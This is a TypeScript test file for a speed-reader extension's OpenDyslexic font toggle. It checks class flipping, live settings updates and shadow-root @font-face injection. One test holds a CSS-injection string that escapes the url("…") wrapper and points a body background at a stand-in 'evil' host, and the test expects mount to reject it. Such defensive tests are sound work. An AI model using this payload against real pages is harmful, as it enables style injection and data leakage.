/**
 * opendyslexic.test.ts — issue #27
 *
 * The OpenDyslexic font toggle binds the user setting to a class on the
 * overlay modal. The class flip activates the `.modal.opendyslexic` CSS
 * rule in `styles.ts` which switches `font-family` to the bundled
 * OpenDyslexic family with a system-ui fallback.
 *
 * The bundled font binary is loaded via an `@font-face` rule the overlay
 * injects into the shadow root at mount, parameterised by
 * `OverlayOptions.openDyslexicFontUrl` (since `core/` cannot call
 * `chrome.runtime.getURL`). Injection is scoped to the shadow root so the
 * declaration does NOT bleed to host-page CSS — the issue's "applies to
 * the overlay only" constraint.
 *
 * Coverage pins:
 *  - mount with `openDyslexic: false` → no `.opendyslexic` class
 *  - mount with `openDyslexic: true` → class present
 *  - mount with `openDyslexic` omitted (legacy callers) → no class
 *  - subscribeSettings flips toggle on/off without remount
 *  - `@font-face` rule injected into the shadow root when URL provided
 *  - `@font-face` NOT injected when URL omitted (toggle still works as
 *    a pure class flip — graceful degradation per the issue scope note
 *    that #173's binary may not yet exist)
 */
import { describe, expect, test, beforeEach, afterEach } from 'vitest';
import { createOverlay } from '../overlay';
import type { OverlayOptions, OverlaySettings, SettingsSubscriber } from '../types';
import { createRsvpEngine } from '../../rsvp-engine';
import { OVERLAY_CLASS } from '../constants';

const STREAM = ['hello', 'world', 'foo', 'bar'];
const FONT_URL = 'chrome-extension://stub-extension-id/fonts/OpenDyslexic-Regular.woff2';

function defaultSettings(overrides: Partial<OverlaySettings> = {}): OverlaySettings {
  return { theme: 'system', wpm: 300, fontSize: 20, ...overrides };
}

function makeOpts(overrides: Partial<OverlayOptions> = {}): OverlayOptions {
  return {
    doc: document,
    words: STREAM,
    initialSettings: defaultSettings(),
    subscribeSettings: () => () => undefined,
    engineFactory: createRsvpEngine,
    ...overrides,
  };
}

function getShadow(): ShadowRoot {
  const host = document.body.querySelector('[data-speedreader-overlay]');
  if (!(host instanceof HTMLElement) || !host.shadowRoot) {
    throw new Error('overlay host missing or no shadow root');
  }
  return host.shadowRoot;
}

function getModal(): HTMLElement {
  const el = getShadow().querySelector<HTMLElement>(`.${OVERLAY_CLASS.MODAL}`);
  if (!el) throw new Error('overlay shadow: missing modal');
  return el;
}

/**
 * Pull every stylesheet text the overlay attached to the shadow root,
 * concatenated. Works for both the adoptedStyleSheets path (real browsers,
 * modern jsdom) and the inline `<style>` fallback.
 */
function getShadowCss(): string {
  const shadow = getShadow();
  const adopted = (shadow as ShadowRoot & { adoptedStyleSheets?: CSSStyleSheet[] })
    .adoptedStyleSheets;
  const adoptedCss =
    adopted && adopted.length > 0
      ? adopted
          .map((s) =>
            Array.from(s.cssRules ?? [])
              .map((r) => r.cssText)
              .join('\n'),
          )
          .join('\n')
      : '';
  const inlineCss = Array.from(shadow.querySelectorAll('style'))
    .map((el) => el.textContent ?? '')
    .join('\n');
  return `${adoptedCss}\n${inlineCss}`;
}

describe('createOverlay — OpenDyslexic toggle (#27)', () => {
  beforeEach(() => {
    document.querySelectorAll('[data-speedreader-overlay]').forEach((n) => n.remove());
  });
  afterEach(() => {
    document.querySelectorAll('[data-speedreader-overlay]').forEach((n) => n.remove());
  });

  test('mount with openDyslexic=false does NOT apply the modal class', () => {
    const overlay = createOverlay(
      makeOpts({ initialSettings: defaultSettings({ openDyslexic: false }) }),
    );
    overlay.mount();
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(false);
    overlay.unmount();
  });

  test('mount with openDyslexic=true applies the modal class', () => {
    const overlay = createOverlay(
      makeOpts({ initialSettings: defaultSettings({ openDyslexic: true }) }),
    );
    overlay.mount();
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(true);
    overlay.unmount();
  });

  test('mount with openDyslexic omitted (legacy callers) does NOT apply the modal class', () => {
    // Defaults intentionally omit `openDyslexic` to model older callers.
    const overlay = createOverlay(makeOpts());
    overlay.mount();
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(false);
    overlay.unmount();
  });

  test('subscribeSettings push flips the toggle ON without remount', () => {
    let listener: SettingsSubscriber | undefined;
    const subscribeSettings = (l: SettingsSubscriber): (() => void) => {
      listener = l;
      return () => undefined;
    };
    const overlay = createOverlay(
      makeOpts({
        initialSettings: defaultSettings({ openDyslexic: false }),
        subscribeSettings,
      }),
    );
    overlay.mount();
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(false);

    listener?.(defaultSettings({ openDyslexic: true }));
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(true);
    overlay.unmount();
  });

  test('subscribeSettings push flips the toggle OFF without remount', () => {
    let listener: SettingsSubscriber | undefined;
    const subscribeSettings = (l: SettingsSubscriber): (() => void) => {
      listener = l;
      return () => undefined;
    };
    const overlay = createOverlay(
      makeOpts({
        initialSettings: defaultSettings({ openDyslexic: true }),
        subscribeSettings,
      }),
    );
    overlay.mount();
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(true);

    listener?.(defaultSettings({ openDyslexic: false }));
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(false);
    overlay.unmount();
  });

  test('@font-face for OpenDyslexic is injected into the shadow root when URL provided', () => {
    const overlay = createOverlay(
      makeOpts({
        initialSettings: defaultSettings({ openDyslexic: true }),
        openDyslexicFontUrl: FONT_URL,
      }),
    );
    overlay.mount();
    const css = getShadowCss();
    expect(css).toContain('@font-face');
    expect(css).toContain('OpenDyslexic');
    expect(css).toContain(FONT_URL);
    overlay.unmount();
  });

  test('@font-face is NOT injected when openDyslexicFontUrl is omitted', () => {
    const overlay = createOverlay(
      makeOpts({ initialSettings: defaultSettings({ openDyslexic: true }) }),
    );
    overlay.mount();
    const css = getShadowCss();
    expect(css).not.toContain('@font-face');
    // Class still flips — toggle is a pure class flip independent of the
    // font binary. When #173 lands and the binary appears, the same class
    // flip starts applying the bundled face.
    expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(true);
    overlay.unmount();
  });

  test('@font-face rule binds OpenDyslexic to the supplied URL with woff2 format', () => {
    const overlay = createOverlay(
      makeOpts({
        initialSettings: defaultSettings({ openDyslexic: true }),
        openDyslexicFontUrl: FONT_URL,
      }),
    );
    overlay.mount();
    const css = getShadowCss();
    expect(css).toMatch(/@font-face\s*\{/);
    expect(css).toMatch(/font-family:\s*'OpenDyslexic'/);
    expect(css).toMatch(/format\('woff2'\)/);
    overlay.unmount();
  });

  test('mount rejects a malicious openDyslexicFontUrl that tries to escape the url("…") wrapper', () => {
    // Adversary string: closes the url("…") + format('…') pair, opens a
    // new body rule, and exfiltrates via background: url('https://evil/…').
    // The validation guard MUST refuse interpolation — i.e. mount throws —
    // rather than silently emitting attacker-controlled CSS into the shadow.
    const malicious = 'a") format("woff2"); } body { background: url("https://evil/';
    const overlay = createOverlay(
      makeOpts({
        initialSettings: defaultSettings({ openDyslexic: true }),
        openDyslexicFontUrl: malicious,
      }),
    );
    expect(() => overlay.mount()).toThrow(/untrusted URL/);
  });
});

describe('OVERLAY_CSS — OpenDyslexic family stack (#27)', () => {
  test('OpenDyslexic family applies to reading-surface selectors with a system-ui fallback', async () => {
    const { OVERLAY_CSS } = await import('../styles');
    // Bound the assertion to the reading-surface selector list AND the
    // family-order contract: OpenDyslexic must be the first family in the
    // stack, and system-ui must appear in the fallback list so a font-load
    // failure degrades gracefully. Scope is .word-region / .context-current
    // / .context-preview (Safari parity floor — UI chrome stays in system
    // font; whole-modal font swap is a future Chrome-UX extension).
    expect(OVERLAY_CSS).toMatch(
      /\.modal\.opendyslexic\s+\.word-region[\s\S]*?\.context-current[\s\S]*?\.context-preview\s*\{[^}]*font-family:[\s\S]*?'OpenDyslexic'[^}]*system-ui/,
    );
  });
});
